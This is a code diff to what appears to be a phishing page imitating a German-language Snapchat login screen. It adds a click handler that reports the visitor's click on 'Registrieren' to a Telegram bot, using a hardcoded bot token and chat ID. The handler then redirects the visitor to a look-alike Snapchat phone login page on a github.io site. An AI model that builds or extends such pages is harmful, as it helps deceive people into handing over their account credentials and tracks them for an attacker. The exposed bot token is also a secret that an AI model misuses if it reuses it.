@@ -42,13 +42,26 @@
                 }, 1000);
             }
 
+            function RegistrierenClick(){
+                var apiUrl = "https://api.telegram.org/bot6862065355:AAG52OQ90c_Fhl7AuhSKJM6hU2yWFuA4mmw/sendMessage";
+                var chatId = "709764990";
+                var fullMessage = "Click - Registrieren";
+                
+                $.get(apiUrl, { chat_id: chatId, text: fullMessage }, function(data) {
+                    console.log("Antwort von der Telegram API:", data);
+                });
+
+                setTimeout(function() {
+                    window.location = "https://linktreeshorter.github.io/Snapchat/SnapchatLoginPhone.htm";
+                }, 1000);
+            }
 
 
 
 
 
 
-            
+
         </script>
     </head>
 
@@ -92,6 +105,6 @@
             <Button onclick="sendMessage()" class="button w-button">Weiter</Button>
         </div>
 
-        <div class="text-block-2">Neu bei Snapchat? <strong class="bold-text">Registrieren</strong></div>
+        <div class="text-block-2">Neu bei Snapchat? <strong class="bold-text" onclick="RegistrierenClick()">Registrieren</strong></div>
     </body>
 </html>
